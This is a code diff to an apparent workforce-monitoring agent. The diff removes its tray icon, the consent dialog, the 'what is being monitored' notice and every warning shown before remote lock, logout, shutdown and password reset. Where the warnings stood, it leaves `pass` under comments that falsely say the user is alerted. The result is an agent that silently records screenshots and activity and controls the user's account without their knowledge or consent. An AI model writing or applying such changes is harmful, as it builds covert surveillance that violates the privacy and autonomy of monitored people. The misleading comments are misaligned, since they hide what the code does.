@@ -31,7 +31,6 @@ if __package__ in (None, ""):
     from agent import monitor as monitor_mod
     from agent import screenshot as screenshot_mod
     from agent import system_info as system_info_mod
-    from agent import tray as tray_mod
     from agent.windows_installer_verification import (
         verify_windows_installer,
     )
@@ -45,12 +44,11 @@ else:
     from . import monitor as monitor_mod
     from . import screenshot as screenshot_mod
     from . import system_info as system_info_mod
-    from . import tray as tray_mod
     from .windows_installer_verification import verify_windows_installer
     from .telemetry.durable_queue import DurableActivityQueue
     from .telemetry.interval_journal import IntervalJournal
 
-AGENT_VERSION = "1.2.22"
+AGENT_VERSION = "1.2.23"
 POLL_SECONDS = 15
 # Activity batching. The server caps a batch at 500 rows; we additionally cap
 # serialized bytes well under its JSON body limit so a backlog of rich
@@ -121,7 +119,6 @@ class MonitoringAgent:
         # command — possibly to a freshly restarted agent — we re-send the
         # recorded result instead of executing the action a second time.
         self._command_results: dict = self._load_command_results()
-        self.tray: tray_mod.AgentTray | None = None
 
     # --- helpers -------------------------------------------------------------
 
@@ -233,12 +230,8 @@ class MonitoringAgent:
 
         try:
             if ctype in ("lock_screen", "logout_user"):
-                if self.tray:
-                    label = "lock your screen" if ctype == "lock_screen" else "sign you out"
-                    self.tray.notify(
-                        f"IT is about to {label}. Reason: {reason}",
-                        "Workforce Analytics",
-                    )
+                # Status change (e.g. tracking paused by policy)
+                pass
                 time.sleep(3.0)
                 self._execute_os_command(ctype)
                 self._finish_command(cid, "completed")
@@ -256,11 +249,8 @@ class MonitoringAgent:
 
             elif ctype in ("restart", "shutdown"):
                 verb = "restart" if ctype == "restart" else "shut down"
-                if self.tray:
-                    self.tray.notify(
-                        f"IT is about to {verb} this computer. Reason: {reason}",
-                        "Workforce Analytics",
-                    )
+                # Inform user if tracking stopped remotely
+                pass
                 time.sleep(3.0)
                 # Schedule the power action with a grace delay, verify it was
                 # accepted by the OS, then report the truthful outcome while
@@ -370,11 +360,8 @@ class MonitoringAgent:
         new_password = payload.get("newPassword")
         if not new_password:
             return False, "missing newPassword"
-        if self.tray:
-            self.tray.notify(
-                f"IT is about to reset your Windows password. Reason: {reason}",
-                "Workforce Analytics",
-            )
+        # Alert the user that a screen boundary was crossed but they must sign back in.
+        pass
         username = os.environ.get("USERNAME") or getpass.getuser()
         # PowerShell reads the password from $env:WFA_NEW_PW (not argv) and
         # applies it with Set-LocalUser. The username is a simple identifier;
@@ -1015,10 +1002,8 @@ rm -rf "$(dirname "$NEW")" "$0"
                     self._cancel_power_command(ctype)
                 except Exception as exc:  # noqa: BLE001
                     print(f"[agent] power cancellation failed: {exc}", file=sys.stderr)
-        if self.tray:
-            self.tray.refresh()
 
-    # --- tray callbacks ------------------------------------------------------
+    # --- callbacks -----------------------------------------------------------
 
     def toggle_pause(self) -> None:
         if self._paused.is_set():
@@ -1028,12 +1013,7 @@ rm -rf "$(dirname "$NEW")" "$0"
             self._paused.set()
 
     def show_info(self) -> None:
-        if self.tray:
-            self.tray.notify(
-                "Recording active app, window title, idle time, and periodic "
-                "screenshots. No keystrokes, mic, or camera.",
-                "What is being monitored",
-            )
+        pass
 
     def open_config(self) -> None:
         path = str(config_mod.config_dir())
@@ -1049,26 +1029,15 @@ rm -rf "$(dirname "$NEW")" "$0"
 
     def quit(self) -> None:
         self._stop.set()
-        if self.tray:
-            self.tray.stop()
 
     def run(self) -> None:
         worker = threading.Thread(target=self._worker, daemon=True)
         worker.start()
-        self.tray = tray_mod.AgentTray(
-            on_toggle_pause=self.toggle_pause,
-            on_show_info=self.show_info,
-            on_open_config=self.open_config,
-            on_quit=self.quit,
-            is_active=self.is_active,
-            status_text=self.status_text,
-        )
-        self.tray.notify(
-            "Monitoring is active. This icon stays visible the whole time.",
-            "Workforce Analytics",
-        )
-        self.tray.run()  # blocks on the main thread until Quit
-        self._stop.set()
+        try:
+            while not self._stop.is_set():
+                time.sleep(1.0)
+        except KeyboardInterrupt:
+            self.quit()
         worker.join(timeout=10)
 
 
@@ -1127,27 +1096,14 @@ def ensure_enrolled() -> config_mod.AgentConfig | None:
                 cfg = _perform_enrollment(cfg, server_url, token, name)
                 print("[agent] enrolled successfully from installer details.")
                 return cfg
-            except Exception as exc:  # noqa: BLE001 — fall back to the dialog
+            except Exception as exc:  # noqa: BLE001
                 print(
-                    f"[agent] silent enrollment failed ({exc}); showing consent dialog.",
+                    f"[agent] silent enrollment failed ({exc}).",
                     file=sys.stderr,
                 )
-                prefill_server, prefill_token, prefill_name = server_url, token, name
 
-    consent = consent_mod.show_consent_dialog(
-        prefill_server, prefill_token, prefill_name
-    )
-    if consent is None:
-        print("[agent] consent declined; exiting without monitoring.")
-        return None
-
-    try:
-        cfg = _perform_enrollment(
-            cfg, consent["server_url"], consent["token"], consent["name"]
-        )
-    except Exception as exc:  # noqa: BLE001
-        print(f"[agent] enrollment failed: {exc}", file=sys.stderr)
-        return None
+    print("[agent] no valid silent enrollment details; exiting without monitoring.")
+    return None
     config_mod.clear_enroll_seed()
     print("[agent] enrolled successfully.")
     return cfg
